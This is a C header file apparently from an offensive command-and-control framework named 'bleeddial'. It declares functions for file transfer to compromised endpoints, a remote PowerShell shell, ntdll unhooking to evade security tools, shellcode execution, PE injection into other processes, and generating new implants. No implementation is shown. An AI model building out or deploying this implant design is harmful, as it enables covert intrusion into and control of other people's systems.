#include "../common.h"

/*
	thread_* should be called with CreateThread only
	sync_* should be called as a ctx.guest_shell(ctx.guest_shell_params)

	top level functions are functions directly called by cli.c
	top level functions must free their params before exiting
*/

/*
	Upload file to the endpoint.
*/
struct upload_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;

	char local_path[255];
	size_t local_path_len;

	char remote_path[255];
	size_t remote_path_len;
};

DWORD WINAPI thread_upload(struct upload_params_t* params);

/*
	Download file to the endpoint.
*/
struct download_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;

	char remote_path[255];
	size_t remote_path_len;

	char local_path[255];
	size_t local_path_len;
};

DWORD WINAPI thread_download(struct download_params_t* params);

/*
	Establishes a PowerShell shell.
*/
struct powershell_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;
};
int sync_powershell(struct powershell_params_t* params);

/*
	Unhooks using local ntdll copy.
*/
struct unhookl_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;
};

DWORD WINAPI thread_unhookl(struct unhookl_params_t* params);

/*
	Unhooks using uploaded ntdll copy.
*/
struct unhookbyon_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;

	char local_path[255];
	size_t local_path_len;
};

DWORD WINAPI thread_unhookbyon(struct unhookbyon_params_t* params);

/*
	Uploads and runs shellcode on endpoint.
*/
struct runcode_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;

	char local_path[255];
	size_t local_path_len;
};

DWORD WINAPI thread_runcode(struct runcode_params_t* params);

/*
	Enumerates processes using CreateToolhelp32Snapshot.
*/
struct pst32_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;
};

struct _pst32_proc_t {
	uint32_t proc_id;
	wchar_t exe_name[255];
};

DWORD WINAPI thread_pst32(struct pst32_params_t* params);

/*
	Uploads and injects an PE into another process.
*/
struct inject_params_t {
	struct bleeddial_ctx_t* ctx;
	endpoint_id_t endpoint_id;

	char local_path[255];
	size_t local_path_len;
	uint32_t target_pid;
};

DWORD WINAPI thread_inject(struct inject_params_t* params);

/*
	.
*/
struct newimplant_params_t {
	struct bleeddial_ctx_t* ctx;
	char path_to_template[255];

	char ip[16];
	char remote_port[16];
	char local_port[16];

	tremont_stream_id ctrl_stream;
};

DWORD WINAPI thread_newimplant(struct newimplant_params_t* params);